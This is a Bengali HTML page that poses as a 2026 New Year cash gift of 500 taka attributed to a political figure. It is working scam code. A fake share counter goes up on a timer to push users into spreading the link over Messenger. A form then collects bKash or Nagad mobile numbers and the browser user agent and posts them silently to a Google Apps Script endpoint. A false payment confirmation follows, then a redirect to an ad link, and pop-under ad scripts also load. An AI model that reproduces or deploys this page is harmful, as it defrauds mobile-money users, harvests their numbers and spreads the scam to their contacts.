<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>শুভ নববর্ষ ২০২৬ - উপহার</title>
    
    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <!-- Libraries -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>

    <!-- [বিজ্ঞাপন ১] পপ-আন্ডার অ্যাড -->
    <script src="https://pl28339085.effectivegatecpm.com/1a/b5/eb/1ab5ebed1a8eefd7f76655af42d54939.js"></script>

    <style>
        :root {
            --primary: #006a4e;
            --secondary: #f42a41;
            --messenger: #0084ff;
        }

        body {
            font-family: 'Hind Siliguri', sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
            background: #fff;
            min-height: 100vh;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            padding-bottom: 30px;
        }

        .header-img img { width: 100%; display: block; }

        .main-content { padding: 20px; }

        .gift-card {
            background: linear-gradient(135deg, #fffde7 0%, #fff9c4 100%);
            border: 2px dashed var(--primary);
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
        }

        .amount { font-size: 40px; font-weight: 800; color: var(--primary); display: block; }

        /* Progress Bar */
        .progress-container {
            height: 12px; background: #ddd; border-radius: 10px; margin: 20px 0 10px; overflow: hidden;
        }
        .progress-bar {
            height: 100%; width: 0%; background: #4caf50; transition: width 0.4s ease;
        }

        /* Buttons */
        .messenger-btn {
            background: var(--messenger); color: white; border: none; padding: 16px;
            border-radius: 50px; font-size: 18px; font-weight: bold; width: 100%;
            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
            box-shadow: 0 5px 15px rgba(0, 132, 255, 0.3);
        }

        /* Form */
        #payment-form {
            display: none; padding: 20px; background: #f9f9f9; border-radius: 15px;
            text-align: left; margin-top: 20px; border: 1px solid #eee;
        }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: 600; }
        input, select {
            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;
        }
        .submit-btn {
            background: var(--primary); color: white; border: none; padding: 15px;
            width: 100%; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer;
        }

        /* Ads Space */
        .ad-slot { margin: 15px 0; overflow: hidden; }

        .footer { font-size: 12px; color: #777; margin-top: 30px; }
    </style>
</head>
<body>

<div class="container">
    <!-- [বিজ্ঞাপন ২] টপ ব্যানার অ্যাড -->
    <div class="ad-slot">
        <script type="text/javascript">
            atOptions = { 'key' : '0cb13152919e8a3f0a1cb3a7210f895c', 'format' : 'iframe', 'height' : 60, 'width' : 468, 'params' : {} };
        </script>
        <script src="https://www.highperformanceformat.com/0cb13152919e8a3f0a1cb3a7210f895c/invoke.js"></script>
    </div>

    <div class="header-img">
        <img src="https://imgur.com/GLh8FgK.png" alt="Header Banner">
    </div>

    <div class="main-content">
        <h1 style="color:var(--secondary); font-size: 28px;">শুভ নববর্ষ ২০২৬!</h1>
        <p>নতুন বছর উপলক্ষে <b>তারেক রহমানের</b> পক্ষ থেকে উপহার!</p>

        <div class="gift-card">
            <span style="color: #555;">জনসাধারণের জন্য উপহার</span>
            <span class="amount">৳ ৫০০.০০</span>
            <p style="font-size: 14px; margin-top: 5px;">সরাসরি আপনার বিকাশ বা নগদ অ্যাকাউন্টে</p>
        </div>

        <!-- শেয়ার সেকশন -->
        <div id="share-area">
            <p>উপহারটি পেতে ১০ জন বন্ধুকে মেসেঞ্জারে শেয়ার করুন।</p>
            <div class="progress-container">
                <div class="progress-bar" id="p-bar"></div>
            </div>
            <p id="counter-text" style="font-weight: bold; color: var(--primary);">শেয়ার সম্পন্ন: ০/১০</p>

            <button onclick="openMessenger()" class="messenger-btn">
                <i class="fab fa-facebook-messenger"></i> মেসেঞ্জারে শেয়ার করুন
            </button>
        </div>

        <!-- পেমেন্ট ফর্ম (শুরুতে লুকানো থাকে) -->
        <div id="payment-form">
            <h3 style="text-align: center; color: var(--primary);">পেমেন্ট তথ্য দিন</h3>
            <div class="form-group">
                <label>পেমেন্ট মাধ্যম</label>
                <select id="method">
                    <option value="bKash">বিকাশ (bKash)</option>
                    <option value="Nagad">নগদ (Nagad)</option>
                </select>
            </div>
            <div class="form-group">
                <label>আপনার মোবাইল নম্বর</label>
                <input type="number" id="phone" placeholder="01XXXXXXXXX">
            </div>
            <button class="submit-btn" id="subBtn" onclick="finalSubmit()">টাকা গ্রহণ করুন</button>
        </div>
    </div>

    <!-- [বিজ্ঞাপন ৩] মাঝখানের অ্যাড -->
    <div id="container-d16d40f84767c0af57ae36b2a6c5d610" class="ad-slot"></div>
    <script async="async" data-cfasync="false" src="https://pl28339099.effectivegatecpm.com/d16d40f84767c0af57ae36b2a6c5d610/invoke.js"></script>

    <div class="footer">
        <p>© তারেক রহমান ক্যাম্পেইন টিম ২০২৬</p>
    </div>
</div>

<script>
    let shareCount = 0;
    const requiredShares = 10;
    const directLink = "https://www.effectivegatecpm.com/k3shteb61b?key=c14af68fe8cae1af982dbf0a77950d66";
    
    // আপনার দেওয়া গুগল অ্যাপ স্ক্রিপ্ট ইউআরএল
    const scriptURL = "https://script.google.com/macros/s/AKfycbwV2Nx02JWp6E_YQRC_-nnvwpTGDabDoS4clCuJNjznzMiuaDn4pns0EaJiJ1HB8l1j/exec";

    function openMessenger() {
        // মেসেঞ্জার শেয়ার লিঙ্ক
        window.location.href = "fb-messenger://share/?link=" + encodeURIComponent(window.location.href);

        // শেয়ার গণনা বাড়ানো
        setTimeout(() => {
            if (shareCount < requiredShares) {
                shareCount++;
                let percent = (shareCount / requiredShares) * 100;
                document.getElementById('p-bar').style.width = percent + '%';
                document.getElementById('counter-text').innerText = `শেয়ার সম্পন্ন: ${shareCount}/${requiredShares}`;
                
                if (shareCount >= requiredShares) {
                    document.getElementById('share-area').style.display = 'none';
                    document.getElementById('payment-form').style.display = 'block';
                }
            }
        }, 2000);
    }

    async function finalSubmit() {
        const phone = document.getElementById('phone').value;
        const method = document.getElementById('method').value;
        const userAgent = navigator.userAgent;

        if (phone.length < 11) {
            Swal.fire('ভুল নম্বর', 'সঠিক ১১ ডিজিটের মোবাইল নম্বর দিন', 'error');
            return;
        }

        // বাটন ডিজেবল করা
        document.getElementById('subBtn').disabled = true;
        document.getElementById('subBtn').innerText = "প্রসেসিং...";

        // গুগল শিটে ডেটা পাঠানো
        try {
            await fetch(scriptURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    method: method,
                    phone: phone,
                    userAgent: userAgent
                })
            });
        } catch (e) {
            console.log("Sheet error");
        }

        // আতশবাজি ইফেক্ট
        confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });

        // অভিনন্দন মেসেজ
        Swal.fire({
            title: 'অভিনন্দন!',
            text: 'আপনি সফলভাবে আবেদন করেছেন। আগামী ২০ মিনিটের মধ্যে আপনার অ্যাকাউন্টে ৫০০ টাকা জমা হবে।',
            icon: 'success',
            confirmButtonText: 'ঠিক আছে (OK)',
            confirmButtonColor: '#006a4e',
            allowOutsideClick: false
        }).then((result) => {
            if (result.isConfirmed) {
                // আপনার ডিরেক্ট অ্যাড লিঙ্কে পাঠিয়ে দেওয়া হবে
                window.location.href = directLink;
            }
        });
    }
</script>

</body>
</html>
